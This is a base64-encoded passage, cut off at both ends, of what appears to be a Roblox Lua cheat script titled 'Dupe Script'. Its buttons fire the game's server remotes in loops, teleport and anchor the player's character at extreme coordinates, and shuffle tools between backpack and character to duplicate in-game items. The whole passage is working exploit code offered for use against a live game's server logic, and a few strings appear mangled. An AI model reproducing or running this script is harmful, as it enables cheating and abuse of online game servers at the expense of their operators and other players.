CAgdGFzay53YWl0KDAuMikKICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQuQW5jaG9yZWQgPSB0cnVlCiAgICAgICAgd2FpdCgwLjMpCiAgICAgICAgbG9jYWwgZHVwaW5nID0gdHJ1ZQogICAgICAgIGZvciBtID0gMSwgNTcgZG8KICAgICAgICAgICAgaWYgZHVwaW5nID09IGZhbHNlIHRoZW4KICAgICAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydC5BbmNob3JlZCA9IGZhbHNlCiAgICAgICAgICAgICAgICByZXR1cm4KICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGlmIGdhbWVHZXRTZXJ2aWNlKFdvcmtzcGFjZSlGaW5kRmlyc3RDaGlsZChDYW1lcmEpIHRoZW4KICAgICAgICAgICAgICAgIGdhbWVHZXRTZXJ2aWNlKFdvcmtzcGFjZSlGaW5kRmlyc3RDaGlsZChDYW1lcmEpRGVzdHJveSgpCiAgICAgICAgICAgIGVuZAogICAgICAgICAgICBsb2NhbCBhcmdzID0gewogICAgICAgICAgICAgICAgWzFdID0gUGlja2luZ1Rvb2xzLAogICAgICAgICAgICAgICAgWzJdID0gdG9vbHRoYXRpd2FudHRvZHVwZQogICAgICAgICAgICB9CiAgICAgICAgICAgIHBpY2t0b29scmVtb3RlSW52b2tlU2VydmVyKHVucGFjayhhcmdzKSkKICAgICAgICAgICAgZ2FtZUdldFNlcnZpY2UoUGxheWVycykuTG9jYWxQbGF5ZXIuQmFja3BhY2tXYWl0Rm9yQ2hpbGQodG9vbHRoYXRpd2FudHRvZHVwZSkuUGFyZW50ID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlcgogICAgICAgICAgICBpZiBkdXBpbmcgPT0gZmFsc2UgdGhlbgogICAgICAgICAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0LkFuY2hvcmVkID0gZmFsc2UKICAgICAgICAgICAgICAgIHJldHVybgogICAgICAgICAgICBlbmQKICAgICAgICAgICAgd2FpdCgpCiAgICAgICAgICAgIGdhbWVHZXRTZXJ2aWNlKFBsYXllcnMpLkxvY2FsUGxheWVyLkNoYXJhY3Rlclt0b29sdGhhdGl3YW50dG9kdXBlXUZpbmRGaXJzdENoaWxkKEhhbmRsZSkuTmFtZSA9IEjibmRs6gogICAgICAgICAgICBnYW1lR2V0U2VydmljZShQbGF5ZXJzKS5Mb2NhbFBsYXllci5DaGFyYWN0ZXJGaW5kRmlyc3RDaGlsZCh0b29sdGhhdGl3YW50dG9kdXBlKS5QYXJlbnQgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQmFja3BhY2sKICAgICAgICAgICAgZ2FtZUdldFNlcnZpY2UoUGxheWVycykuTG9jYWxQbGF5ZXIuQmFja3BhY2tGaW5kRmlyc3RDaGlsZCh0b29sdGhhdGl3YW50dG9kdXBlKS5QYXJlbnQgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyCiAgICAgICAgICAgIHJlcGVhdAogICAgICAgICAgICAgICAgaWYgZ2FtZUdldFNlcnZpY2UoV29ya3NwYWNlKUZpbmRGaXJzdENoaWxkKENhbWVyYSkgdGhlbgogICAgICAgICAgICAgICAgICAgIGdhbWVHZXRTZXJ2aWNlKFdvcmtzcGFjZSlGaW5kRmlyc3RDaGlsZChDYW1lcmEpRGVzdHJveSgpCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIHdhaXQoKQogICAgICAgICAgICB1bnRpbCBnYW1lR2V0U2VydmljZShQbGF5ZXJzKS5Mb2NhbFBsYXllci5DaGFyYWN0ZXJGaW5kRmlyc3RDaGlsZCh0b29sdGhhdGl3YW50dG9kdXBlKSA9PSBuaWwKICAgICAgICBlbmQKICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQuQW5jaG9yZWQgPSBmYWxzZQogICAgICAgIHJlcGVhdCB3YWl0KCkgdW50aWwgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlckZpbmRGaXJzdENoaWxkKEh1bWFub2lkUm9vdFBhcnQpID09IG5pbAogICAgICAgIHJlcGVhdCB3YWl0KCkgdW50aWwgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlckZpbmRGaXJzdENoaWxkKEh1bWFub2lkUm9vdFBhcnQpCiAgICAgICAgbG9jYWwgdG9vbGdyaXAgPSB0cnVlCiAgICAgICAgZHVwaW5nID0gZmFsc2UKICAgICAgICB3YWl0KCkKICAgICAgICBsb2NhbCBncmlwQmFzZSA9IENGcmFtZS5uZXcoLTAuMjkwMDg2NzQ2LCAwLjA3NTU4MTA3MzgsIC0wLjAxMDk4NzI4MTgsIDAuMDQzOTU2MDQxMywgMC41MDk3MDU5MDEsIC0wLjg1OTIyNTA5NCwgLTAuMDU5MTQ1MDYzMiwgLTAuODU3MjIwMTczLCAtMC41MTE1NDIyNjEsIC0wLjk5NzI4MTEzNCwgMC4wNzMzMDQyODA2LCAtMC4wMDc1MzM0MzEwNSkKICAgICAgICBsb2NhbCBncmlwUG9zaXRpb25zID0gewogICAgICAgICAgICBWZWN0b3IzLm5ldygwLCAwLCAwKSwgVmVjdG9yMy5uZXcoMCwgMC41LCAwKSwgVmVjdG9yMy5uZXcoMCwgMSwgMCksIFZlY3RvcjMubmV3KDAsIDEuNSwgMCksCiAgICAgICAgICAgIFZlY3RvcjMubmV3KDAsIDIsIDApLCBWZWN0b3IzLm5ldygwLCAyLjUsIDApLCBWZWN0b3IzLm5ldygwLCAzLCAwKSwgVmVjdG9yMy5uZXcoMCwgMy41LCAwKSwKICAgICAgICAgICAgVmVjdG9yMy5uZXcoMCwgNCwgMCksIFZlY3RvcjMubmV3KDAsIDQuNSwgMCksIFZlY3RvcjMubmV3KDAsIDUsIDApLCBWZWN0b3IzLm5ldygwLCA1LCAtMSksCiAgICAgICAgICAgIFZlY3RvcjMubmV3KDAsIDUsIC0yKSwgVmVjdG9yMy5uZXcoMCwgNSwgLTMpLCBWZWN0b3IzLm5ldygwLCA1LCAtNCksIFZlY3RvcjMubmV3KDAsIDUsIC01KSwKICAgICAgICAgICAgVmVjdG9yMy5uZXcoMCwgNSwgLTYpLCBWZWN0b3IzLm5ldygwLCA1LCAtNyksIFZlY3RvcjMubmV3KDAsIDUsIC04KSwgVmVjdG9yMy5uZXcoMCwgNSwgLTkpLAogICAgICAgICAgICBWZWN0b3IzLm5ldygwLCA1LCAtMTApLCBWZWN0b3IzLm5ldygwLCA1LjUsIC0xMCksIFZlY3RvcjMubmV3KDAsIDYsIC0xMCksIFZlY3RvcjMubmV3KDAsIDYuNSwgLTEwKSwKICAgICAgICAgICAgVmVjdG9yMy5uZXcoMCwgNywgLTEwKSwgVmVjdG9yMy5uZXcoMCwgNy41LCAtMTApLCBWZWN0b3IzLm5ldygwLCA4LCAtMTApLCBWZWN0b3IzLm5ldygwLCA4LjUsIC0xMCksCiAgICAgICAgICAgIFZlY3RvcjMubmV3KDAsIDksIC0xMCksIFZlY3RvcjMubmV3KDAsIDkuNSwgLTEwKSwgVmVjdG9yMy5uZXcoMCwgMTAsIC0xMCksIFZlY3RvcjMubmV3KDAsIDEwLCAtNSksCiAgICAgICAgICAgIFZlY3RvcjMubmV3KDAsIDEwLCAtNC41KSwgVmVjdG9yMy5uZXcoMCwgMTAsIC00KSwgVmVjdG9yMy5uZXcoMCwgMTAsIC0zLjUpLCBWZWN0b3IzLm5ldygwLCAxMCwgLTMpLAogICAgICAgICAgICBWZWN0b3IzLm5ldygwLCAxMCwgLTIuNSksIFZlY3RvcjMubmV3KDAsIDEwLCAtMiksIFZlY3RvcjMubmV3KDAsIDEwLCAtMS41KSwgVmVjdG9yMy5uZXcoMCwgMTAsIC0xKSwKICAgICAgICAgICAgVmVjdG9yMy5uZXcoMCwgMTAsIC0wLjUpLCBWZWN0b3IzLm5ldygwLCAxMCwgMCksIFZlY3RvcjMubmV3KDAsIDksIC01KSwgVmVjdG9yMy5uZXcoMCwgOCwgLTUpLAogICAgICAgICAgICBWZWN0b3IzLm5ldygwLCA3LCAtNSksIFZlY3RvcjMubmV3KDAsIDYsIC01KSwgVmVjdG9yMy5uZXcoMCwgNSwgLTUpLCBWZWN0b3IzLm5ldygwLCA0LCAtNSksCiAgICAgICAgICAgIFZlY3RvcjMubmV3KDAsIDMsIC01KSwgVmVjdG9yMy5uZXcoMCwgMiwgLTUpLCBWZWN0b3IzLm5ldygwLCAxLCAtNSksIFZlY3RvcjMubmV3KDAsIDAsIC01KSwKICAgICAgICAgICAgVmVjdG9yMy5uZXcoMCwgMCwgLTEwKSwgVmVjdG9yMy5uZXcoMCwgMCwgLTkpLCBWZWN0b3IzLm5ldygwLCAwLCAtOCksIFZlY3RvcjMubmV3KDAsIDAsIC03KSwKICAgICAgICAgICAgVmVjdG9yMy5uZXcoMCwgMCwgLTYpCiAgICAgICAgfQogICAgICAgIGZvciBfLCBwb3MgaW4gaXBhaXJzKGdyaXBQb3NpdGlvbnMpIGRvCiAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFja1t0b29sc10uR3JpcCA9IGdyaXBCYXNlICsgcG9zCiAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFja1t0b29sc10uTmFtZSA9IG5hbWV0b29scwogICAgICAgIGVuZAogICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydC5DRnJhbWUgPSBvbGRjZnJhbWUKICAgICAgICB3YWl0KDAuNSkKICAgICAgICBmb3IgXywgdG9vbCBpbiBpcGFpcnMoZ2FtZUdldFNlcnZpY2UoUGxheWVycykuTG9jYWxQbGF5ZXIuQmFja3BhY2tHZXRDaGlsZHJlbigpKSBkbwogICAgICAgICAgICBpZiB0b29sSXNBKFRvb2wpIGFuZCB0b29sLk5hbWUgPT0gbmFtZXRvb2xzIHRoZW4KICAgICAgICAgICAgICAgIHRvb2wuUGFyZW50ID0gZ2FtZUdldFNlcnZpY2UoUGxheWVycykuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgZW5kCn0pCgotLSBCdXR0b24gZm9yIEZpcmVYIENyb3NzClRvb2xzVGFiQWRkQnV0dG9uKHsKICAgIE5hbWUgPSBGaXJlWCBDcm9zcywKICAgIENhbGxiYWNrID0gZnVuY3Rpb24oKQogICAgICAgIGxvY2FsIG5hbWV0b29scyA9IGNyb3NzIGZpcmV4IGxlbAogICAgICAgIGxvY2FsIG9sZGNmcmFtZSA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydC5DRnJhbWUKICAgICAgICBnYW1lR2V0U2VydmljZShTdGFydGVyR3VpKVNldENvcmUoU2VuZE5vdGlmaWNhdGlvbiwgewogICAgICAgICAgICBUaXRsZSA9IER1cGUgU2NyaXB0LAogICAgICAgICAgICBUZXh0ID0gUGxlYXNlIGRvIG5vdCBlcXVpcCBhbnkgdG9vbHMgb3IgdW5lcXVpcCB0b29scyBvciBjbGljayB0b29scyBvbiBpbnZlbnRvcnkuIEl0IHdpbGwgYnJlYWsgdGhlIHNjcmlwdC4sCiAgICAgICAgICAgIEJ1dHRvbjEgPSBJIHVuZGVyc3RhbmQsCiAgICAgICAgICAgIER1cmF0aW9uID0gNQogICAgICAgIH0pCiAgICAgICAgbG9jYWwgdG9vbHRoYXRpd2FudHRvZHVwZSA9IEZpcmVYCiAgICAgICAgbG9jYWwgdG9vbHMgPSBGaXJlWAogICAgICAgIGlmIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWQuU2l0ID09IHRydWUgdGhlbgogICAgICAgICAgICB0YXNrLndhaXQoKQogICAgICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkLlNpdCA9IGZhbHNlCiAgICAgICAgZW5kCiAgICAgICAgd2FpdCgwLjEpCiAgICAgICAgbG9jYWwgYXJncyA9IHsKICAgICAgICAgICAgWzFdID0gQ2xlYXJBbGxUb29scwogICAgICAgIH0KICAgICAgICBjbGVhcnRvb2xyZW1vdGVGaXJlU2VydmVyKHVucGFjayhhcmdzKSkKICAgICAgICBpZiBnYW1lR2V0U2VydmljZShXb3Jrc3BhY2UpRmluZEZpcnN0Q2hpbGQoQ2FtZXJhKSB0aGVuCiAgICAgICAgICAgIGdhbWVHZXRTZXJ2aWNlKFdvcmtzcGFjZSlGaW5kRmlyc3RDaGlsZChDYW1lcmEpRGVzdHJveSgpCiAgICAgICAgZW5kCiAgICAgICAgZm9yIG0gPSAxLCAyIGRvCiAgICAgICAgICAgIHRhc2sud2FpdCgpCiAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydC5DRnJhbWUgPSBDRnJhbWUubmV3KDk5OTk5OTk5OS40MTQsIC00OTAsIDk5OTk5OTk5OS40MTQsIDAuOTc0MzYwNDA2LCAtMC4xNzU3MzQwODgsIDAuMTQwNDk3NjEsIC0wLjEzMzQ0MTQwNCwgMC4wNTE0MDUzMDY5LCAwLjk4OTcyMjcyOSwgLTAuMTgxMTUwMzAyLCAtMC45ODMwOTQ2OTIsIDAuMDI2NjM3MDkyMikKICAgICAgICBlbmQKICAgICAgICB0YXNrLndhaXQoMC4yKQogICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydC5BbmNob3JlZCA9IHRydWUKICAgICAgICB3YWl0KDAuMykKICAgICAgICBsb2NhbCBkdXBpbmcgPSB0cnVlCiAgICAgICAgZm9yIG0gPSAxLCA3MSBkbwogICAgICAgICAgICBpZiBkdXBpbmcgPT0gZmFsc2UgdGhlbgogICAgICAgICAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0LkFuY2hvcmVkID0gZmFsc2UKICAgICAgICAgICAgICAgIHJldHVybgogICAgICAgICAgICBlbmQKICAgICAgICAgICAgaWYgZ2FtZUdldFNlcnZpY2UoV29ya3NwYWNlKUZpbmRGaXJzdENoaWxkKENhbWVyYSkgdGhlbgogICAgICAgICAgICAgICAgZ2FtZUdldFNlcnZpY2UoV29ya3NwYWNlKUZpbmRGaXJzdENoaWxkKENhbWVyYSlEZXN0cm95KCkKICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGxvY2FsIGFyZ3MgPSB7CiAgICAgICAgICAgICAgICBbMV0gPSBQaWNraW5nVG9vbHMsCiAgICAgICAgICAgICAgICBbMl0gPSB0b29sdGhhdGl3YW50dG9kdXBlCiAgICAgICAgICAgIH0KICAgICAgICAgICAgcGlja3Rvb2xyZW1vdGVJbnZva2VTZXJ2ZXIodW5wYWNrKGFyZ3MpKQogICAgICAgICAgICBnYW1lR2V0U2VydmljZShQbGF5ZXJzKS5Mb2NhbFBsYXllci5CYWNrcGFja1dhaXRGb3JDaGlsZCh0b29sdGhhdGl3YW50dG9kdXBlKS5QYXJlbnQgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyCiAgICAgICAgICAgIGlmIGR1cGluZyA9PSBmYWxzZSB0aGVuCiAgICAgICAgICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQuQW5jaG9yZWQgPSBmYWxzZQogICAgICAgICAgICAgICAgcmV0dXJuCiAgICAgICAgICAgIGVuZAogICAgICAgICAgICB3YWl0KCkKICAgICAgICAgICAgZ2FtZUdldFNlcnZpY2UoUGxheWVycykuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyW3Rvb2x0aGF0aXdhbnR0b2R1cGVdRmluZEZpcnN0Q2hpbGQoSGFuZGxlKS5OYW1lID0gSOJuZGzqCiAgICAgICAgICAgIGdhbWVHZXRTZXJ2aWNlKFBsYXllcnMpLkxvY2FsUGxheWVyLkNoYXJhY3RlckZpbmRGaXJzdENoaWxkKHRvb2x0aGF0aXdhbnR0b2R1cGUpLlBhcmVudCA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFjawogICAgICAgICAgICBnYW1lR2V0U2VydmljZShQbGF5ZXJzKS5Mb2NhbFBsYXllci5CYWNrcGFja0ZpbmRGaXJzdENoaWxkKHRvb2x0aGF0aXdhbnR0b2R1cGUpLlBhcmVudCA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIKICAgICAgICAgICAgcmVwZWF0CiAgICAgICAgICAgICAgICBpZiBnYW1lR2V0U2VydmljZShXb3Jrc3BhY2UpRmluZEZpcnN0Q2hpbGQoQ2FtZXJhKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgZ2FtZUdldFNlcnZpY2UoV29ya3NwYWNlKUZpbmRGaXJzdENoaWxkKENhbWVyYSlEZXN0cm95KCkKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgd2FpdCgpCiAgICAgICAgICAgIHVudGlsIGdhbWVHZXRTZXJ2aWNlKFBsYXllcnMpLkxvY2FsUGxheWVyLkNoYXJhY3RlckZpbmRGaXJzdENoaWxkKHRvb2x0aGF0aXdhbnR0b2R1cGUpID09IG5pbAogICAgICAgIGVuZAogICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydC5BbmNob3JlZCA9IGZhbHNlCiAgICAgICAgcmVwZWF0IHdhaXQoKSB1bnRpbCBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyRmluZEZpcnN0Q2hpbGQoSHVtYW5vaWRSb290UGFydCkgPT0gbmlsCiAgICAgICAgcmVwZWF0IHdhaXQoKSB1bnRpbCBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyRmluZEZpcnN0Q2hpbGQoSHVtYW5vaWRSb290UGFydCkKICAgICAgICBsb2NhbCB0b29sZ3JpcCA9IHRydWUKICAgICAgICBkdXBpbmcgPSBmYWxzZQogICAgICAgIHdhaXQoKQogICAgICAgIGxvY2FsIGdyaXBCYXNlID0gQ0ZyYW1lLm5ldygwLjA1MzgzMzM0NjgsIC0wLjI2NDgxMjQ2OSwgLTAuMDE3NzU5NDI5MywgMC45OTk5OTg2MjksIDAsIDAuMDAxNjQwMTE4MDgsIDAsIDEsIDAsIC0wLjAwMTY0MDExODA4LCAwLCAwLjk5OTk5ODYyOSkKICAgICAgICBsb2NhbCBncmlwUG9zaXRpb25zID0gewogICAgICAgICAgICBWZWN0b3IzLm5ldygwLCAtMiwgMCksIFZlY3RvcjMubmV3KDAsIC00LCAwKSwgVmVjdG9yMy5uZXcoMCwgLTYsIDApLCBWZWN0b3IzLm5ldygwLCAtOCwgMCksCiAgICAgICAgICAgIFZlY3RvcjMubmV3KDAsIC0xMCwgMCksIFZlY3RvcjMubmV3KDAsIC0xMiwgMCksIFZlY3RvcjMubmV3KDAsIC0xNCwgMCksIFZlY3RvcjMubmV3KDEsIC0xNCwgMCksCiAgICAgICAgICAgIFZlY3RvcjMubmV3KDIsIC0xNCwgMCksIFZlY3RvcjMubmV3KDMsIC0xNCwgMCksIFZlY3RvcjMubmV3KDQsIC0xNCwgMCksIFZlY3RvcjMubmV3KDUsIC0xNCwgMCksCiAgICAgICAgICAgIFZlY3RvcjMubmV3KDYsIC0xNCwgMCksIFZlY3RvcjMubmV3KDcsIC0xNCwgMCksIFZlY3RvcjMubmV3KDgsIC0xNCwgMCksIFZlY3RvcjMubmV3KDksIC0xNCwgMCksCiAgICAgICAgICAgIFZlY3RvcjMubmV3KDEwLCAtMTQsIDApLCBWZWN0b3IzLm5ldygxMSwgLTE0LCAwKSwgVmVjdG9yMy5uZXcoMTIsIC0xNCwgMCksIFZlY3RvcjMubmV3KDEzLCAtMTQsIDApLAogICAgICAgICAgICBWZWN0b3IzLm5ldygxNCwgLTE0LCAwKSwgVmVjdG9yMy5uZXcoMTUsIC0xNCwgMCksIFZlY3RvcjMubmV3KDE2LCAtMTQsIDApLCBWZWN0b3IzLm5ldygxNywgLTE0LCAwKSwKICAgICAgICAgICAgVmVjdG9yMy5uZXcoMTgsIC0xNCwgMCksIFZlY3RvcjMubmV3KDE5LCAtMTQsIDApLCBWZWN0b3IzLm5ldygyMCwgLTE0LCAwKSwgVmVjdG9yMy5uZXcoMjAsIC0xNiwgMCksCiAgICAgICAgICAgIFZlY3RvcjMubmV3KDIwLCAtMTgsIDApLCBWZWN0b3IzLm5ldygyMCwgLTIwLCAwKSwgVmVjdG9yMy5uZXcoMjAsIC0yMiwgMCksIFZlY3RvcjMubmV3KDIwLCAtMjQsIDApLAogICAgICAgICAgICBWZWN0b3IzLm5ldygyMCwgLTI2LCAwKSwgVmVjdG9yMy5uZXcoMjAsIC0yOCwgMCksIFZlY3RvcjMubmV3KDIwLCAtMzAsIDApLCBWZWN0b3IzLm5ldygxMCwgLTMwLCAwKSwKICAgICAgICAgICAgVmVjdG9yMy5uZXcoMTAsIC0yOCwgMCksIFZlY3RvcjMubmV3KDEwLCAtMjYsIDApLCBWZWN0b3IzLm5ldygxMCwgLTI0LCAwKSwgVmVjdG9yMy5uZXcoMTAsIC0yMiwgMCksCiAgICAgICAgICAgIFZlY3RvcjMubmV3KDEwLCAtMjAsIDApLCBWZWN0b3IzLm5ldygxMCwgLTE4LCAwKSwgVmVjdG9yMy5uZXcoMTAsIC0xNiwgMCksIFZlY3RvcjMubmV3KDEwLCAtMTQsIDApLAogICAgICAgICAgICBWZWN0b3IzLm5ldygxMCwgLTEyLCAwKSwgVmVjdG9yMy5uZXcoMTAsIC0xMCwgMCksIFZlY3RvcjMubmV3KDEwLCAtOCwgMCksIFZlY3RvcjMubmV3KDEwLCAtNiwgMCksCiAgICAgICAgICAgIFZlY3RvcjMubmV3KDEwLCAtNCwgMCksIFZlY3RvcjMubmV3KDEwLCAtMiwgMCksIFZlY3RvcjMubmV3KDExLCAtMiwgMCksIFZlY3RvcjMubmV3KDEyLCAtMiwgMCksCiAgICAgICAgICAgIFZlY3RvcjMubmV3KDEzLCAtMiwgMCksIFZlY3RvcjMubmV3KDE0LCAtMiwgMCksIFZlY3RvcjMubmV3KDE1LCAtMiwgMCksIFZlY3RvcjMubmV3KDE2LCAtMiwgMCksCiAgICAgICAgICAgIFZlY3RvcjMubmV3KDE3LCAtMiwgMCksIFZlY3RvcjMubmV3KDE4LCAtMiwgMCksIFZlY3RvcjMubmV3KDE5LCAtMiwgMCksIFZlY3RvcjMubmV3KDIwLCAtMiwgMCksCiAgICAgICAgICAgIFZlY3RvcjMubmV3KDEsIC0zMCwgMCksIFZlY3RvcjMubmV3KDAsIC0zMCwgMCksIFZlY3RvcjMubmV3KDIsIC0zMCwgMCksIFZlY3RvcjMubmV3KDMsIC0zMCwgMCksCiAgICAgICAgICAgIFZlY3RvcjMubmV3KDQsIC0zMCwgMCksIFZlY3RvcjMubmV3KDUsIC0zMCwgMCksIFZlY3RvcjMubmV3KDYsIC0zMCwgMCksIFZlY3RvcjMubmV3KDcsIC0zMCwgMCksCiAgICAgICAgICAgIFZlY3RvcjMubmV3KDgsIC0zMCwgMCksIFZlY3RvcjMubmV3KDksIC0zMCwgMCkKICAgICAgICB9CiAgICAgICAgZm9yIF8sIHBvcyBpbiBpcGFpcnMoZ3JpcFBvc2l0aW9ucykgZG8KICAgICAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkJhY2twYWNrW3Rvb2xzXS5HcmlwID0gZ3JpcEJhc2UgKyBwb3MKICAgICAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkJhY2twYWNrW3Rvb2xzXS5OYW1lID0gbmFtZXRvb2xzCiAgICAgICAgZW5kCiAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0LkNGcmFtZSA9IG9sZGNmcmFtZQogICAgICAgIHdhaXQoMC41KQogICAgICAgIGZvciBfLCB0b29sIGluIGlwYWlycyhnYW1lR2V0U2VydmljZShQbGF5ZXJzKS5Mb2NhbFBsYXllci5CYWNrcGFja0dldENoaWxkcmVuKCkpIGRvCiAgICAgICAgICAgIGlmIHRvb2xJc0EoVG9vbCkgYW5kIHRvb2wuTmFtZSA9PSBuYW1ldG9vbHMgdGhlbgogICAgICAgICAgICAgICAgdG9vbC5QYXJlbnQgPSBnYW1lR2V0U2VydmljZShQbGF5ZXJzKS5Mb2NhbFBsYXllci5DaGFyYWN0ZXIKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICBlbmQKfSkKCi0tIFNlY3Rpb24gZm9yIEF1cmEgR3JpcApTZWN0aW9uID0gVG9vbHNUYWJBZGRTZWN0aW9uKHsKICAgIE5hbWUgPSBBdXJhIEdyaXAKfSkKCi0tIEJ1dHRvbiBmb3IgQ291Y2ggQXVyYQpUb29sc1RhYkFkZEJ1dHRvbih7CiAgICBOYW1lID0gQ291Y2ggQXVyYSwKICAgIENhbGxiYWNrID0gZnVuY3Rpb24oKQogICAgbmFtZXRvb2xzID0gQ291Y2ggU3ByYXkgbGVsCiAgICAgICAgICAgICAgICBvbGRjZnJhbWUgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQuQ0ZyYW1lCmdhbWVHZXRTZXJ2aWNlKFN0YXJ0ZXJHdWkpU2V0Q29yZShTZW5kTm90aWZpY2F0aW9uLHtUaXRsZT1EdXBlIFNjcmlwdCxUZXh0PVBsZWFzZSBkbyBub3QgZXF1aXAgYW55IHRvb2xzIG9yIHVuZXF1aXAgdG9vbHMgb3IgY2xpY2sgdG9vbHMgb24gaW52ZW50b3J5LiBJdCB3aWxsIGJyZWFrIHRoZSBzY3JpcHQuLCBCdXR0b24xID0gSSB1bmRlcnN0YW5kICxEdXJhdGlvbj01fSkKICAgICAgICAgICAgICAgIHRvb2x0aGF0aXdhbnR0b2R1cGUgPSBDb3VjaAogICAgICAgICAgICAgICAgdG9vbHMgPSBDb3VjaAogICAgICAgICAgICAgICAgaWYgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZC5TaXQgPT0gdHJ1ZSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgpCiAgICAgICAgICAgICAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWQuU2l0ID0gZmFsc2UKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgd2FpdCgwLjEpCiAgICAgICAgICAgICAgICBsb2NhbCBhcmdzID0gewogICAgICAgICAgICAgICAgICAgICAgICBbMV0gPSBDbGVhckFsbFRvb2xzCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIGNsZWFydG9vbHJlbW90ZUZpcmVTZXJ2ZXIodW5wYWNrKGFyZ3MpKQogICAgICAgICAgICAgICAgaWYgZ2FtZUdldFNlcnZpY2UoV29ya3NwYWNlKUZpbmRGaXJzdENoaWxkKENhbWVyYSkgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICBnYW1lR2V0U2VydmljZShXb3Jrc3BhY2UpRmluZEZpcnN0Q2hpbGQoQ2FtZXJhKURlc3Ryb3koKSBlbmQKICAgICAgICAgICAgICAgIGZvciBtPTEsMiBkbyB0YXNrLndhaXQoKQogICAgICAgICAgICAgICAgICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQuQ0ZyYW1lID0gQ0ZyYW1lLm5ldyg5OTk5OTk5OTkuNDE0LCAtNDkwLCA5OTk5OTk5OTkuNDE0LCAwLjk3NDM2MDQwNiwgLTAuMTc1NzM0MDg4LCAwLjE0MDQ5NzYxLCAtMC4xMzM0NDE0MDQsIDAuMDUxNDA1MzA2OSwgMC45ODk3MjI3MjksIC0wLjE4MTE1MDMwMiwgLTAuOTgzMDk0NjkyLCAwLjAyNjYzNzA5MjIpCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoMC4yKQogICAgICAgICAgICAgICAgICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQuQW5jaG9yZWQgPSB0cnVlCiAgICAgICAgICAgICAgICB3YWl0KDAuMykKICAgICAgICAgICAgICAgIGR1cGluZyA9IHRydWUKICAgICAgICAgICAgICAgIGZvciBtPTEsIDEyNCBkbwogICAgICAgICAgICAgICAgICAgICAgICBpZiBkdXBpbmcgPT0gZmFsc2UgdGhlbiBnYW1lLlB